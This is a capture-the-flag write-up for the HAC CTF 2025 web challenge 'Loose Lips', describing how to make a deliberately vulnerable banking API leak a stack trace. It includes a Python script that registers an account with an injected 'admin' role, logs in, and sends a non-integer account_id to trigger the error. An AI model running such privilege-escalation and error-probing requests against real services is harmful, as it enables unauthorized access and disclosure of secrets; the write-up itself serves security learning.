---
title: HAC CTF 2025 Loose Lips
draft: false
tags:
  - ctf
  - web-exploitation
---
# Loose Lips

> A new digital banking API (SecureBank) has been deployed to production, but the developers may have left debugging features enabled. Your task is to identify if any sensitive information, particularly API encryption keys, is being exposed in error responses.

This challenge was a bit of a pain, because there were a lot of different endpoints and it wasn't clear what endpoint I should be trying to get errors from. I found a couple vulnerabilities in general, such as the ability to register an admin account, but I was never able to get that to get to a flag path. I then considered using RESTler, which is a REST API fuzzer to just fuzz the API and find the crash, but figured it more than likely wouldn't detect it (I'm not able to guarantee the crash will throw an HTTP 500). Eventually, just from testing the different endpoints with unexpected payloads, I determined that `/api/accounts?account_id=` expects an integer, and if you pass a string, it will error because `int()` cannot be used on a string. This will reveal the whole stacktrace in the response.

```python
BASE_URL = 'https://loose-lips.chals.ctf.malteksolutions.com'

username = 'test@test.com'
password = 'test'

r = requests.post(BASE_URL + '/api/register', json = {
    'email': username,
    'password': password,
    'first_name': 'test',
    'last_name': 'test',
    'role': 'admin'
})
print(r.text)

# login with x-www-form-urlencoded
r = requests.post(BASE_URL + '/api/login', data = {
    'username': username,
    'password': password,
})
print(r.text)
token = r.json()['access_token']

r = requests.get(BASE_URL + f'/api/accounts?account_id=a', headers = {
    'Authorization': f'Bearer {token}'
})
print(r.text)
```